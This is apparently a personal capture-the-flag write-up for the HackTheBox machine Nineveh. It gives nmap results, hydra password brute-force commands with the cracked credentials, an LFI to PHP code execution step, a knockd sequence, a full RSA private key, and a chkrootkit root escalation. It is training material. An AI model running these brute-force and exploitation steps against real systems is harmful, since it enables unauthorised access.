# Information gathering

## system network

10.10.10.43

## Nmap Scan Result

``` bash
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.68 seconds
```

Exploit

*Login Crack*

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt  -s 443 -f nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."

[443][http-post-form] host: nineveh.htb   login: admin   password: password123
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid"

[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
```

### Local File Include

_vulnerablity_

[ Remote PHP Code Execute ](https://www.exploit-db.com/exploits/24044)

#### Proof

![[Pasted image 20221226162022.png]]

### Lateral Movement

pspy64 - find cron task

```bash
2022/12/26 02:31:35 CMD: UID=0    PID=1      | /sbin/init                                                                                                                      
2022/12/26 02:32:01 CMD: UID=0    PID=23714  | /usr/sbin/CRON -f                                                                                                               
2022/12/26 02:32:01 CMD: UID=0    PID=23716  | /bin/bash /root/vulnScan.sh                                                                                                     
2022/12/26 02:32:01 CMD: UID=0    PID=23715  | /bin/sh -c /root/vulnScan.sh                                                                                                    
2022/12/26 02:32:01 CMD: UID=0    PID=23717  | /bin/bash /root/vulnScan.sh 
2022/12/26 02:32:01 CMD: UID=0    PID=23719  | /bin/sh /usr/bin/chkrootkit                                                                                                     
2022/12/26 02:32:01 CMD: UID=0    PID=23721  | sed -e s/:/ /g                                                                                                                  
2022/12/26 02:32:01 CMD: UID=0    PID=23720  | /bin/sh /usr/bin/chkrootkit                                                                                                     
2022/12/26 02:32:01 CMD: UID=0    PID=23722  | /bin/sh /usr/bin/chkrootkit                                                                                                     
2022/12/26 02:32:01 CMD: UID=0    PID=23735  | /bin/uname -s                                                                                                                   
2022/12/26 02:32:02 CMD: UID=0    PID=23737  | /bin/ps ax                                                                                                                      
2022/12/26 02:32:02 CMD: UID=0    PID=23741  | /bin/sh /usr/bin/chkrootkit                                                                                                     
2022/12/26 02:32:02 CMD: UID=0    PID=23740  | /bin/sh /usr/bin/chkrootkit  
2022/12/26 02:32:02 CMD: UID=0    PID=23739  | /bin/sh /usr/bin/chkrootkit 
2022/12/26 02:32:02 CMD: UID=0    PID=23738  | /bin/sh /usr/bin/chkrootkit                                                                                                     
2022/12/26 02:32:02 CMD: UID=0    PID=23743  | grep -E (^|[^A-Za-z0-9_])amd([^A-Za-z0-9_]|$)                                                                                   
2022/12/26 02:32:02 CMD: UID=0    PID=23742  |                                     
2022/12/26 02:32:02 CMD: UID=0    PID=23746  | grep -E c                   
2022/12/26 02:32:02 CMD: UID=0    PID=23745  | /bin/sh /usr/bin/chkrootkit                                                                                                     
2022/12/26 02:32:02 CMD: UID=0    PID=23744  | /bin/sh /usr/bin/chkrootkit                                                                                                     
2022/12/26 02:32:02 CMD: UID=0    PID=23750  | grep -E (^|[^A-Za-z0-9_])basename([^A-Za-z0-9_]|$)                                                                              
2022/12/26 02:32:02 CMD: UID=0    PID=23749  | /bin/sh /usr/bin/chkrootkit                                                                                                     
2022/12/26 02:32:02 CMD: UID=0    PID=23753  | grep -E c                                                                                                                       
2022/12/26 02:32:02 CMD: UID=0    PID=23752  | /bin/sh /usr/bin/chkrootkit                                                                                                     
2022/12/26 02:32:02 CMD: UID=0    PID=23751  | /bin/sh /usr/bin/chkrootkit 
```

_netstat_

find knockd:

```bash
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

_get private key with strings_

```bash
-----BEGIN RSA PRIVATE KEY-----                                                                                                                                                
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----

```

_ssh with localhost_

```bash
ssh -i id_key amrois@localhost
```

_open ssh_

利用 `knock` 开启 22 端口

```bash
knock -v 10.10.10.43 xxx xxx xxx
```

### Privilege Escalation

[ chkrootkit exp ](https://www.exploit-db.com/exploits/33899)

#### proof

![[Pasted image 20221226172702.png]]

